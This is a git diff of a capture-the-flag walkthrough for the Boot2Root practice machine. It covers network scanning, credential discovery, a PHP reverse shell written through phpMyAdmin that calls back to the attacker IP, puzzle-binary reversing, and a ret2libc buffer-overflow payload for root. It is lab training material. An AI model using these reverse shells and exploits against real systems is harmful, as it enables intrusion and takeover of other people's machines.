@@ -1,8 +1,6 @@
 # Enumeration Part
 
-After starting the machine, we have this interface:
-
-![Boot2Root Interface](https://github.com/MouadDv/Boot2Root/blob/main/img/interface)
+Let's start the machine.
 
 Unlike Snow-Crash, the machine doesn't provide us with any information such as IP address, users, or running services.
 
@@ -10,13 +8,9 @@ We can set the virtual machine network to bridge mode to communicate with it usi
 
 Using **nmap**, we can start [network reconnaissance](https://nmap.org/book/man-host-discovery.html) to quickly identify the IP of the machine without scanning all its ports. We can use the `-sn` option to ping all hosts and retrieve MAC addresses. Optionally, add `-v` for verbose mode to see all scanned machines (host up/down). In this case, we’ll skip verbose mode.
 
-
-
 ```bash
 sudo nmap -sn -sV 192.168.1.0/24
 ```
-
-![Nmap -sn Example](https://github.com/MouadDv/Boot2Root/blob/main/img/nmap_sn.png)
 
 Our attacker machine's IP is **192.168.1.6**, so the target machine's IP is:
 
@@ -34,8 +28,6 @@ Now, let’s scan for open ports:
 sudo nmap -sC -sS -p- -vvv 192.168.1.5
 ```
 
-![Nmap Scan Results](https://github.com/MouadDv/Boot2Root/blob/main/img/nmap_port.png)
-
 ### Results:
 
 We found:
@@ -43,9 +35,6 @@ We found:
 - IMAP port
 - FTP port
 - Two web server ports, one with title **Hack me if you can** (port 80).
-
-![hackmeifyoucan](https://github.com/MouadDv/Boot2Root/blob/main/img/hackmeifyoucan.png)
-
 
 ### Web Directory Enumeration
 
@@ -103,23 +92,15 @@ Inside `/webmail`:
 
 Visiting the forum, we see topics. In one, **Probleme login ? - lmezard, 2015-10-08, 00:10**, the logs show:
 
-![user](https://github.com/MouadDv/Boot2Root/blob/main/img/usersearch.png)
-
 ```
 Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
 ```
 
 This password seems to work for the user `lmezard` on the forum. After logging in, we find their email: `laurie@borntosec.net`.
 
-
-![emailfound](https://github.com/MouadDv/Boot2Root/blob/main/img/emailfound.png)
-
 ### Step 2: Database Credentials
 
 In the webmail, we find this message:
-
-![webmail](https://github.com/MouadDv/Boot2Root/blob/main/img/webmail.png)
-
 
 ```
 Subject: DB Access
@@ -130,15 +111,9 @@ Best regards.
 
 ### Step 3: Reverse Shell via phpMyAdmin
 
-
-With phpMyAdmin access that we found in the email, we can exploit the **SELECT INTO OUTFILE** feature to upload a reverse shell. We need a writable directory .
-
-based on [instllation guid](https://github.com/My-Little-Forum/mylittleforum/wiki/Installation) we found that :
- **`/forum/templates_c`**, which has `777` permissions.
+With phpMyAdmin access, we can exploit the **SELECT INTO OUTFILE** feature to upload a reverse shell. We need a writable directory and choose **`/forum/templates_c`**, which has `777` permissions.
 
 #### Reverse Shell Code:
-
-the reverse shell that we can use :
 
 ```php
 <?php
@@ -148,7 +123,6 @@ exec("bash -c 'bash -i >& /dev/tcp/192.168.1.6/2020 0>&1'");
 
 #### SQL Query:
 
-And marge the reverse shell with  **select into outfile** to create a reverse shell with php that can run when  navigate to templates_c
 ```sql
 SELECT "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/192.168.1.6/2020 0>&1\"');?>" INTO OUTFILE '/var/www/forum/templates_c/reverse.php';
 ```
@@ -165,38 +139,825 @@ Start a listener:
 nc -lvnp 2020
 ```
 
-After we get access to the machine :
+You now have a reverse shell!
 
-![shell](https://github.com/MouadDv/Boot2Root/blob/main/img/reverse_shell.png)
+### Step 4: Escalate to `lmezard`
 
+In `/home/LOOKATME`:
 
-to enhance revershell we need to upgrade to tty, then we can use su and anther command:
+```
+www-data@BornToSecHackMe:/home/LOOKATME$ ls -la
+total 1
+drwxr-x--- 2 www-data www-data  31 Oct  8  2015 .
+-rwxr-x--- 1 www-data www-data  25 Oct  8  2015 password
+```
+
+The password file contains:
+
+```
+lmezard:G!@M6f4Eatau{sF"
+```
+
+Switch users:
+
+```bash
+su lmezard
+```
+
+If there’s a TTY error, resolve it:
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-to get root machine we start search for any possible vulnerability , so we start first with kernel version  after run uname -a to get all info about the system that we in , we get the resutl:
+### Step 5: Challenge
+
+In `lmezard`'s home directory, there’s a tar archive `fun`:
+
+We can extract is to our machine using a simple HTTP server.
+
+```bash
+python -m SimpleHTTPServer 8080
+```
+
+Then we can extract it using:
+
+```bash
+tar -xvf fun
+```
+
+The tar archive contain a lot of files.
+
+Examining some of them we can clearly see that they are tagged with a number at the end.
+
+
+We wrote a script that read the content of every file and sort them based on their number.
+
+The output of our script seem to be a C++ code that need to be compiled but it contain some syntax error
+
+Mannualy expected and correcting the syntax error we successfully can compile it and execute it to get the following output:
 
 ```
-Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 athlon i386 GNU/Linux
+MY PASSWORD IS: Iheartpwnage
+Now SHA-256 it and submit
 ```
 
-after search the linux kerenl 3.2.0.91 part of a  famous vulnerability dirty cow:
+Hash the password:
 
-more info : 
+```bash
+echo -n "Iheartpwnage" | sha256sum
+```
 
-- https://www.youtube.com/watch?v=CQcgz43MEZg
-- https://www.youtube.com/watch?v=FKdZ0QEIga8
-- https://chao-tic.github.io/blog/2017/05/24/dirty-cow
+Login as `laurie` via SSH using the hashed password!
 
-after you read resource we can use dirty cow or dirty copy-on-write race condation to overwrite the /etc/password and change the passowrd of the root directly 
+When we access Laurie's SSH session, we find two files:
 
-we can copy the exploit and paste like that :
-cat > dirty.c << EOF
+- An executable named bomb
+- A README file containing the following:
 
-and then gcc dirty.c -o dirty -pthread -lcrypt
+```
+Diffuse this bomb!
+When you have all the passwords, use them as the "thor" user with SSH.
 
-and type password that we want to change to and wait for race condation, now we upgrade the tty and su root
+HINT:
+P
+ 2
+ b
 
-![root](https://github.com/MouadDv/Boot2Root/blob/main/img/root.png)
+o
+4
+
+NO SPACE IN THE PASSWORD (password is case sensitive).
+
+```
+The executable bomb is a new puzzle game where we need to find six answers to defuse the bomb.
+
+To find the solutions to the six phases of the bomb, we disassembled it using binaryninja.
+
+The decompilation proccess isn't fully accurate as it always guess the code based on it's assembly but we can keep switching between assemly view and Pseudo C to understand the binary behavior.
+
+Based on the main function:
+
+```C++
+  {
+      void* const var_28;
+      
+      if (argc != 1)
+      {
+          if (argc != 2)
+          {
+              printf("Usage: %s [<input_file>]\n", *(uint32_t*)argv);
+              exit(8);
+              /* no return */
+          }
+          
+          var_28 = &data_8049620;
+          FILE* eax_2 = fopen(argv[1], &data_8049620);
+          infile = eax_2;
+          
+          if (eax_2 == 0)
+          {
+              printf("%s: Error: Couldn't open %s\n", *(uint32_t*)argv, argv[1]);
+      exit(8);
+              /* no return */
+          }
+      }
+      else
+          infile = stdin;
+      
+      initialize_bomb();
+      printf("Welcome this is my little bomb !…", var_28);
+      printf("only one life good luck !! Have …");
+      phase_1(read_line());
+      phase_defused();
+      printf("Phase 1 defused. How about the n…");
+      phase_2(read_line());
+      phase_defused();
+      printf("That's number 2.  Keep going!\n");
+      phase_3(read_line());
+      phase_defused();
+      printf("Halfway there!\n");
+      phase_4(read_line());
+      phase_defused();
+      printf("So you got that one.  Try this o…");
+      phase_5(read_line());
+      phase_defused();
+      printf("Good work!  On to the next...\n");
+      phase_6(read_line());
+      phase_defused();
+      return 0;
+  }
+
+```
+
+We need to complete 6 phases, each with only one attempt. Let's explore what the first phase entails.
+
+```C++
+  {
+      int32_t result = strings_not_equal(arg1, "Public speaking is very easy.");
+      
+      if (result == 0)
+          return result;
+      
+      explode_bomb();
+      /* no return */
+  }
+```
+
+It’s pretty straightforward – we just need to use the string "Public speaking is very easy." as input. Let’s move on to phase 2.
+
+```C++
+  {
+      int32_t var_1c;
+      read_six_numbers(arg1, &var_1c);
+      
+      if (var_1c != 1)
+      {
+          explode_bomb();
+          /* no return */
+      }
+      
+      int32_t result;
+      
+      for (int32_t i = 1; i <= 5; i += 1)
+      {
+          void var_20;
+          result = ((i + 1) * *(uint32_t*)(&var_20 + (i << 2)));
+          
+          if (&var_1c[i] != result)
+          {
+              explode_bomb();
+              /* no return */
+          }
+      }
+      
+      return result;
+  }
+```
+
+The first number we provide has to be equal to 1, furthermore, our input needs to have exactly 6 numbers. The next number has to be equal to the index of the loop + 1 multiplied by the previous number. For example:
+
+```
+current_number = 1
+index = 1
+next_number = (index + 1) * current_number = 2
+
+current_number = 2
+index = 2
+next_number = (index + 1) * current_number = 6
+
+current_number = 6
+index = 3
+next_number = (index + 1) * current_number = 24
+
+[...]
+
+
+```
+
+Based on this logic the final answer is : ```1 2 6 24 120 720```
+
+Phase 3:
+
+```C++
+  {
+      int32_t result_1;
+      char var_9;
+      int32_t var_8;
+      if (sscanf(arg1, "%d %c %d", &result_1, &var_9, &var_8) <= 2)
+      {
+          explode_bomb();
+          /* no return */
+      }
+      
+      int32_t ebx;
+      
+      if (result_1 > 7)
+      {
+          ebx = 0x78;
+          explode_bomb();
+          /* no return */
+      }
+      
+      int32_t result = result_1;
+      
+      switch (result)
+      {
+          case 0:
+          {
+              ebx = 0x71;
+              
+              if (var_8 != 0x309)
+              {
+                  explode_bomb();
+                  /* no return */
+              }
+              break;
+          }
+          case 1:
+          {
+              ebx = 0x62;
+              
+              if (var_8 != 0xd6)
+              {
+                  explode_bomb();
+                  /* no return */
+              }
+              break;
+          }
+          case 2:
+          {
+              ebx = 0x62;
+              
+              if (var_8 != 0x2f3)
+              {
+                  explode_bomb();
+                  /* no return */
+              }
+              break;
+          }
+          case 3:
+          {
+              ebx = 0x6b;
+              
+              if (var_8 != 0xfb)
+              {
+                  explode_bomb();
+                  /* no return */
+              }
+              break;
+          }
+          case 4:
+          {
+              ebx = 0x6f;
+              
+              if (var_8 != 0xa0)
+              {
+                  explode_bomb();
+                  /* no return */
+              }
+              break;
+          }
+          case 5:
+          {
+              ebx = 0x74;
+              
+              if (var_8 != 0x1ca)
+              {
+                  explode_bomb();
+                  /* no return */
+              }
+              break;
+          }
+          case 6:
+          {
+              ebx = 0x76;
+              
+              if (var_8 != 0x30c)
+              {
+                  explode_bomb();
+                  /* no return */
+              }
+              break;
+          }
+          case 7:
+          {
+              ebx = 0x62;
+              
+              if (var_8 != 0x20c)
+              {
+                  explode_bomb();
+                  /* no return */
+              }
+              break;
+          }
+      }
+      
+      if (ebx == var_9)
+          return result;
+      
+      explode_bomb();
+      /* no return */
+  }
+
+```
+
+This function reads three inputs using sscanf(arg1, "%d %c %d", &result_1, &var_9, &var_8).
+
+The first input, an integer, is used in a switch case, so the possible values are from 0 to 7.
+
+The second input is a character, corresponding to each case:
+
+```
+0 => q
+1 => b
+2 => b
+3 => k
+4 => o
+5 => t
+6 => v
+7 => b
+```
+
+and The third value is checked in every case with an if statement, correlating with the first value.
+
+
+Here are all the possible answers:
+
+```
+0 q 777
+1 b 214
+2 b 755
+3 k 251
+4 o 160
+5 t 458
+6 v 780
+7 b 524
+```
+
+Phase 4:
+
+```C
+  int func4(int arg1) 
+  {
+      if (arg1 <= 1)
+          return 1;
+      
+      int32_t eax_1 = func4((arg1 - 1));
+      return (func4((arg1 - 2)) + eax_1);
+  }
+
+  int32_t phase_4(char* arg1)
+  {
+      int32_t var_8;
+      
+      if ((sscanf(arg1, "%d", &var_8) != 1 || var_8 <= 0))
+      {
+          explode_bomb();
+          /* no return */
+      }
+      
+      int32_t result = func4(var_8);
+      
+      if (result == 55)
+          return result;
+      
+      explode_bomb();
+      /* no return */
+  }
+
+```
+
+This function take a single integer input.
+
+The func4 function computes values from the Fibonacci sequence.
+Specifically, the Fibonacci sequence follows the pattern:
+```C
+F(0) = 1
+F(1) = 1
+F(n) = F(n - 1) + F(n - 2) for n > 1.
+```
+
+
+The goal of phase 4 is to provide an input (arg1) such that func4(arg1) returns 55. which is 9.
+
+Phase 5:
+
+```C
+  char array.123[16] = "isrveawhobpnutfg"
+
+  int32_t phase_5(char* arg1)
+  {
+      if (string_length(arg1) != 6)
+      {
+          explode_bomb();
+          /* no return */
+      }
+      
+      void var_c;
+      
+      for (char* i = nullptr; i <= 5; i = &i[1])
+      {
+          int32_t eax;
+          eax = *(uint8_t*)(i + arg1);
+          eax &= 0xf;
+          eax = array.123[((int32_t)eax)];
+          *(uint8_t*)(i + &var_c) = eax;
+      }
+      
+      char var_6 = 0;
+      int32_t result = strings_not_equal(&var_c, "giants");
+      
+      if (result == 0)
+          return result;
+      
+      explode_bomb();
+      /* no return */
+  }
+
+```
+
+We need to provide a string of exactly 6 characters. 
+
+For each character in the input string, we extract the last 4 bits (using bitwise AND with 0xf) `eax &= 0xf;`
+
+These bits are then used as indices to look up characters from the predefined `array.123="isrveawhobpnutfg"`.
+
+For example, if the input character is 'a'
+
+`a & 0b00001111` gives `0`0000001` (index 1)
+
+`array.123[1]` corresponds to `s` in the array
+
+After constructing the new string from the array, we compare it against the target string "giants".
+
+If they match, we return 0. If not, the bomb is triggered.
+
+In this phase the possible combination that are validated by the bomb are massive. So we opted to generate a password list to try and use all combinations possible.
+
+The scripts are included in scripts folder.
+
+
+Phase 6:
+
+```C
+  int32_t phase_6(char* arg1)
+  {
+      void* esi;
+      void* var_58 = esi;
+      void var_1c;
+      read_six_numbers(arg1, &var_1c);
+      
+      for (int32_t i = 0; i <= 5; i += 1)
+      {
+          if ((*(uint32_t*)(&var_1c + (i << 2)) - 1) > 5)
+          {
+              explode_bomb();
+              /* no return */
+          }
+          
+          for (int32_t j = (i + 1); j <= 5; j += 1)
+          {
+              if (*(uint32_t*)((i << 2) + &var_1c) == *(uint32_t*)(&var_1c + (j << 2)))
+              {
+                  explode_bomb();
+                  /* no return */
+              }
+          }
+      }
+      
+      int32_t* var_34;
+      
+      for (int32_t i_1 = 0; i_1 <= 5; i_1 += 1)
+      {
+          void* esi_3 = &node1;
+          int32_t j_1 = 1;
+          int32_t eax_5 = (i_1 << 2);
+          
+          if (1 < *(uint32_t*)(eax_5 + &var_1c))
+          {
+              esi_3 = &node1;
+              
+              do
+              {
+                  esi_3 = *(uint32_t*)((char*)esi_3 + 8);
+                  j_1 += 1;
+              } while (j_1 < *(uint32_t*)(eax_5 + &var_1c));
+          }
+          
+          &var_34[i_1] = esi_3;
+      }
+      
+      int32_t* esi_4 = var_34;
+      int32_t* var_38 = esi_4;
+      
+      for (int32_t i_2 = 1; i_2 <= 5; i_2 += 1)
+      {
+          int32_t* eax_7 = &var_34[i_2];
+          esi_4[2] = eax_7;
+          esi_4 = eax_7;
+      }
+      
+      esi_4[2] = 0;
+      int32_t i_3 = 0;
+      int32_t* esi_6 = var_38;
+      int32_t result;
+      
+      do
+      {
+          result = *(uint32_t*)esi_6;
+          
+          if (result < *(uint32_t*)esi_6[2])
+          {
+              explode_bomb();
+              /* no return */
+          }
+          
+          esi_6 = esi_6[2];
+          i_3 += 1;
+      } while (i_3 <= 4);
+      
+      return result;
+  }
+```
+
+First, the program read 6 numbers as an input.
+
+In the first for loop. The program check if our 6 numbers we inputed are within 0 to 6 range. If not the bomb get's triggered.
+
+In the second for loop. We can see that the program reference `node1` which is predefined in .data binary.
+
+We also can see that the program access multiple values at this address incrementing by 8.
+```C
+do
+{
+    esi_3 = *(uint32_t*)((char*)esi_3 + 8);
+    j_1 += 1;
+} while (j_1 < *(uint32_t*)(eax_5 + &var_1c));
+
+```
+
+As the program isn't stipped we can use GDB to access these addreases and print their value.
+
+We can see that the program define globally a linked list that is not sorted and based on our input the linked list get sorted and checked after if it's sorted correctly. If not the bomb explode.
+
+
+
+
+
+# User thor
+
+As the bomb program says we have to merge all solutions of the 6 parts and use them as the password for root but the third and fifth phase has multiple valid answer. So we don't have a clear way to know which one of those combination is the correct one. So we used a password generator based on all the combinations possibale and we tried them all to determin the correct.
+
+Note: Also the subject state that we have to switch a specific numbers for the password to be correct.
+
+```
+For the part related to a (bin) bomb: If the password found is
+123456. The password to use is 123546.
+```
+
+
+This is it:
+
+Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+
+
+Alright, lets login to the thor user with the new password.
+
+```bash
+laurie@BornToSecHackMe:~$ su thor
+Password:
+thor@BornToSecHackMe:~$
+```
+
+
+Let’s check what’s in the home directory.
+
+```bash
+thor@BornToSecHackMe:~$ ls
+README  turtle
+
+
+thor@BornToSecHackMe:~$ cat README
+Finish this challenge and use the result as password for 'zaz' user.
+Let's finish this challenge then! There is a turtle executable in the home directory, let's see what it contains.
+
+
+thor@BornToSecHackMe:~$ cat turtle
+Tourne gauche de 90 degrees
+Avance 50 spaces
+Avance 1 spaces
+Tourne gauche de 1 degrees
+Avance 1 spaces
+Tourne gauche de 1 degrees
+Avance 1 spaces
+[...]
+```
+
+
+This is clearly instruction to follow and draw the something.
+Let's translate the instruction to a valid turtle instrction and use an online python compiler to run the code.
+
+
+Using SCP we can copy the file to our local machine.
+
+```bash
+scp thor@192.168.11.134:/home/thor/turtle .
+```
+
+
+Using the script turtle.py and the website `https://pythonsandbox.com/turtle` we can see that the final output is the word: SLASH
+
+However, it doesn't work as a password for the zaz user! Furthermore, if we look at the end of the turtle file, we can see the following:
+
+```
+Can you digest the message? :)
+```
+
+The word digest is a hint, we need to hash the password. After using multiple hashing algorithms, I found that MD5 works for the password of the zaz user.
+
+```
+646da671ca01bb5d84dbb5fb2238dc8e
+```
+
+# User zaz
+
+Lets login into the zaz user with the password we just found.
+
+```bash
+thor@BornToSecHackMe:~$ su zaz
+Password:
+zaz@BornToSecHackMe:~$ ls
+exploit_me  mail
+```
+
+
+
+# Exploit the binary 
+
+If we run `ls -la` in the zaz home folder file we can notice that exploit_me have setuid bite set that mean if we can exploit the binary we can run somthing or get shell by id root:
+
+
+
+### start to reverse the binary
+
+start by run
+- file exploit_me
+```
+exploit_me: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x2457e2f88d6a21c3893bc48cb8f2584bcd39917e, not stripped
+```
+
+we can run webserver in the machine with pyhton2 python -m SimpleHTTPServer PORT
+
+we get it in our attack machine and start reverse it by binary ninja, after reverse it in C we see that programe check if we recive argument if yes copy the data of that argument to str,
+
+but we dont know the size of str , se we can start disassembly the binary :
+
+
+
+
+The first two lines form the prologue, which prepares the stack for the function's execution. This ensures that the function operates within its own stack frame while preserving the caller's stack state.
+
+```
+080483f4  55                 push    ebp {__saved_ebp}
+080483f5  89e5               mov     ebp, esp {__saved_ebp}
+```
+push ebp:
+Saves the caller's base pointer (ebp) on the stack.
+This ensures that the original stack frame can be restored when the function returns.
+mov ebp, esp:
+Copies the current stack pointer (esp) into the base pointer (ebp).
+This establishes a new stack frame for the current function, making it easier to reference local variables and function arguments relative to ebp.
+This sets up the foundation for the function to manage its local variables and arguments without interfering with the caller's stack.
+
+Next, we see this line in the assembly:
+
+```
+080483fa  81ec90000000       sub     esp, 0x90
+```
+sub esp, 0x90:
+Reserves 0x90 (144 in decimal) bytes of stack space for local variables.
+The stack grows downward in memory, so subtracting from esp moves it to a lower address, effectively "reserving" space.
+In this function, the reserved space is for the local buffer str[144]
+
+now we know the size of the buffer and because The assembly uses the strcpy function to copy argv[1] into the buffer str.
+The key problem here is that strcpy does not check the size of the input (argv[1]) against the size of the buffer (str[144]).
+If the input string (argv[1]) is longer than 144 bytes, it will overwrite memory beyond the buffer, including critical stack data like the saved return address.
+
+### Next Step: Checking Binary Protections
+Before attempting to exploit the vulnerability, it is essential to determine the level of protection applied to the binary. This helps us understand the potential challenges we might face when crafting an exploit.
+
+We use the checksec tool to analyze the binary’s security features. This tool inspects protection mechanisms such as stack canaries, NX (No Execute), PIE (Position Independent Executable), and RELRO (Read-Only Relocations). These mechanisms, if enabled, can significantly difficult exploitation.
+```
+└─$ checksec --verbose --file=./exploit_me 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   66 Symbols        No    0               1               ./exploit_me
+```
+
+
+- RELRO (Read-Only Relocations):
+No RELRO: The Global Offset Table (GOT) is writable, making it vulnerable to GOT overwrites. While this isn’t directly relevant for a stack buffer overflow, it’s important for advanced exploitation techniques.
+
+- Stack Canary:
+No canary found: The binary does not include stack canaries, which are random values placed before the return address to detect buffer overflows. Without canaries, the program cannot detect an overflow before the return address is overwritten.
+
+-NX (No Execute):
+NX disabled: The stack is executable, meaning any injected shellcode can run directly from the stack. This simplifies exploitation significantly, as no additional bypass techniques (e.g., ret2libc) are needed.
+
+- PIE (Position Independent Executable):
+No PIE: The binary does not randomize its base address, making memory addresses static across executions. This allows us to calculate the exact location of the return address and shellcode.
+
+- FORTIFY_SOURCE:
+No: The binary does not use glibc's FORTIFY_SOURCE, which adds runtime checks for buffer overflows in certain functions (e.g., strcpy). This further exposes the vulnerability in strcpy.
+
+what we can do  with that inforamation :
+No stack canary → No overflow detection.
+NX disabled → Shellcode can run directly from the stack.
+No PIE → Memory addresses are predictable.
+No RELRO → GOT overwrites are possible for advanced exploits.
+
+now let test where the offset that can overflow and edit the return address to our shellcode :
+To determine the offset that overflows the stack and overwrites the EIP, we used pwndbg to visualize the stack during execution.
+
+First, we launched gdb with the vulnerable binary:
+
+```gdb ./exploit_me```
+Next, we ran the program with 145 As as input:
+
+```run $(python -c 'print("A" * 145)')```
+
+Upon inspecting the registers, we observed that the EIP register, which should hold the address of the next instruction, was overwritten with 0x41414141. This confirms that the input overflowed the buffer and reached the return address.
+Since 0x41 represents the ASCII character A, this confirms the payload size needed to overwrite the EIP. From here, we can calculate the exact offset to control the return address and redirect execution.
+
+after testing multiple times to change EIP to my shellcode nothig work but what we sure that buffer overfolow work :
+
+```
+buffer_size = 140
+eip = b"\x42\x42\x42\x42"  
+payload = b"A" * buffer_size + eip
+print(payload)
+```
+
+
+
+you can see that EIP change to 0x42424242 that proof that we controll the next instruction adress ,
+
+
+so we change the technique to `ret2libc`  exploits the program by using already existing library functions, such as those in the libc (standard C library) insted of inject shellcode
+#### How Ret2Libc Works:
+
+Control EIP: The buffer overflow is used to overwrite the return address (EIP) to point to a libc function like system().
+Build Payload: The payload consists of:
+
+Address of system().
+A "return address" (can be any valid address; typically the program exits cleanly afterward).
+Address of a string (e.g., "/bin/sh") that will be passed as an argument to system().
+Execution Flow: When the program executes and hits the overwritten return address, it calls system("/bin/sh"), which spawns a shell.
+
+in our case :
+[ Buffer (AAA...AAA) ] --> Overwrite
+[ Address of system() ] --> Address of libc `system`
+[ Fake Return Address ] --> Can be any valid address
+[ Address of "/bin/sh" ] --> Argument to `system()`
+
+
+so the pyload to exploit the machine now :
+buffer_size = 140  # Offset to EIP
+system_addr = b'\x60\xb0\xe6\xb7'  # Already little-endian
+exit_addr = b'\xe0\xeb\xe5\xb7'    # Already little-endian
+bin_sh_addr = b'\x58\xcc\xf8\xb7'  # Already little-endian
+
+payload = b"A" * buffer_size + system_addr + exit_addr + bin_sh_addr
+
+print(payload)
+with open("payload.txt", "wb") as f:
+    f.write(payload)
+
+more info about the exploit and how you get the adresses of the library in memory:
+- https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
+
+
+you can get sytem and exit addresess memory 
+- info proc map
+- strings -a -t x /lib/i386-linux-gnu/libc-2.27.so | grep "/bin/sh"
